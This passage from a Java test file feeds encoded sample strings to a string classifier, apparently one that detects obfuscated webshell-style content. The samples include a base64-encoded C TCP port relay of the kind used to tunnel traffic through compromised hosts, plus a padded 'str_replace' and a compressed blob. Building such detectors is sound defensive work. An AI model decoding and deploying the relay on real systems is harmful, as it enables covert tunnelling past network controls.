                        "vcigiYmluZCIpOw0KICAgIHJldHVybiAyMDsNCiAgfQ0KICBpZiAobGlzdGVuKGxzb2NrLCAxKSkgew0KICAgIHBlcnJvcigibGlzdGVuIik7DQogIC\n" +
                        "AgcmV0dXJuIDIwOw0KICB9DQogIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0gLTEpIHsNCiAgICBwZXJyb3IoImZvcmsiKTsNCiAgICByZXR1cm4gMjA7D\n" +
                        "QogIH0NCiAgaWYgKG5ieXQgPiAwKQ0KICAgIHJldHVybiAwOw0KICBzZXRzaWQoKTsNCiAgd2hpbGUgKChjc29jayA9IGFjY2VwdChsc29jaywgJmNh\n" +
                        "ZGRyLCAmY2FkZHJsZW4pKSAhPSAtMSkgew0KICAgIGNmaWxlID0gZmRvcGVuKGNzb2NrLCJyKyIpOw0KICAgIGlmICgobmJ5dCA9IGZvcmsoKSkgPT0\n" +
                        "gLTEpIHsNCiAgICAgIGZwcmludGYoY2ZpbGUsICI1MDAgZm9yazogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgICBzaHV0ZG93bihjc29jay\n" +
                        "wyKTsNCiAgICAgIGZjbG9zZShjZmlsZSk7DQogICAgICBjb250aW51ZTsNCiAgICB9DQogICAgaWYgKG5ieXQgPT0gMCkNCiAgICAgIGdvdG8gZ290c\n" +
                        "29jazsNCiAgICBmY2xvc2UoY2ZpbGUpOw0KICAgIHdoaWxlICh3YWl0cGlkKC0xLCBOVUxMLCBXTk9IQU5HKSA+IDApOw0KICB9DQogIHJldHVybiAy\n" +
                        "MDsNCg0KIGdvdHNvY2s6DQogIGlmICgob3NvY2sgPSBzb2NrZXQoUEZfSU5FVCwgU09DS19TVFJFQU0sIElQUFJPVE9fVENQKSkgPT0gLTEpIHsNCiA\n" +
                        "gICBmcHJpbnRmKGNmaWxlLCAiNTAwIHNvY2tldDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICBvYWRkci\n" +
                        "5zaW5fZmFtaWx5ID0gaC0+aF9hZGRydHlwZTsNCiAgb2FkZHIuc2luX3BvcnQgPSBodG9ucyhvcG9ydCk7DQogIG1lbWNweSgmb2FkZHIuc2luX2FkZ\n" +
                        "HIsIGgtPmhfYWRkciwgaC0+aF9sZW5ndGgpOw0KICBpZiAoY29ubmVjdChvc29jaywgJm9hZGRyLCBzaXplb2Yob2FkZHIpKSkgew0KICAgIGZwcmlu\n" +
                        "dGYoY2ZpbGUsICI1MDAgY29ubmVjdDogJXNcbiIsIHN0cmVycm9yKGVycm5vKSk7DQogICAgZ290byBxdWl0MTsNCiAgfQ0KICB3aGlsZSAoMSkgew0\n" +
                        "KICAgIEZEX1pFUk8oJmZkc3IpOw0KICAgIEZEX1pFUk8oJmZkc2UpOw0KICAgIEZEX1NFVChjc29jaywmZmRzcik7DQogICAgRkRfU0VUKGNzb2NrLC\n" +
                        "ZmZHNlKTsNCiAgICBGRF9TRVQob3NvY2ssJmZkc3IpOw0KICAgIEZEX1NFVChvc29jaywmZmRzZSk7DQogICAgaWYgKHNlbGVjdCgyMCwgJmZkc3IsI\n" +
                        "E5VTEwsICZmZHNlLCBOVUxMKSA9PSAtMSkgew0KICAgICAgZnByaW50ZihjZmlsZSwgIjUwMCBzZWxlY3Q6ICVzXG4iLCBzdHJlcnJvcihlcnJubykp\n" +
                        "Ow0KICAgICAgZ290byBxdWl0MjsNCiAgICB9DQogICAgaWYgKEZEX0lTU0VUKGNzb2NrLCZmZHNyKSB8fCBGRF9JU1NFVChjc29jaywmZmRzZSkpIHs\n" +
                        "NCiAgICAgIGlmICgobmJ5dCA9IHJlYWQoY3NvY2ssYnVmLDQwOTYpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgICBpZiAoKHdyaXRlKG9zb2NrLG\n" +
                        "J1ZixuYnl0KSkgPD0gMCkNCglnb3RvIHF1aXQyOw0KICAgIH0gZWxzZSBpZiAoRkRfSVNTRVQob3NvY2ssJmZkc3IpIHx8IEZEX0lTU0VUKG9zb2NrL\n" +
                        "CZmZHNlKSkgew0KICAgICAgaWYgKChuYnl0ID0gcmVhZChvc29jayxidWYsNDA5NikpIDw9IDApDQoJZ290byBxdWl0MjsNCiAgICAgIGlmICgod3Jp\n" +
                        "dGUoY3NvY2ssYnVmLG5ieXQpKSA8PSAwKQ0KCWdvdG8gcXVpdDI7DQogICAgfQ0KICB9DQoNCiBxdWl0MjoNCiAgc2h1dGRvd24ob3NvY2ssMik7DQo\n" +
                        "gIGNsb3NlKG9zb2NrKTsNCiBxdWl0MToNCiAgZmZsdXNoKGNmaWxlKTsNCiAgc2h1dGRvd24oY3NvY2ssMik7DQogcXVpdDA6DQogIGZjbG9zZShjZm\n" +
                        "lsZSk7DQogIHJldHVybiAwOw0KfQ==",
                "2cf1656ed3df6864df08feaf603ebe13", "e67c2597ecad64bb4cdad6633b04107f","eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce",
                "eJwlmt2aqjrXbW8pAam9PJwIAVFCEfIDOQPiUwgBKaUUufo9fL+DdTLXnFWYjNF7a6ouddccuuky2j89rp2J"));

        testStrings.forEach(content -> {
            System.out.println(content.substring(0, Math.min(content.length(), 20)));
            System.out.println(StringParser.classify(content).getName());
        });
    }
}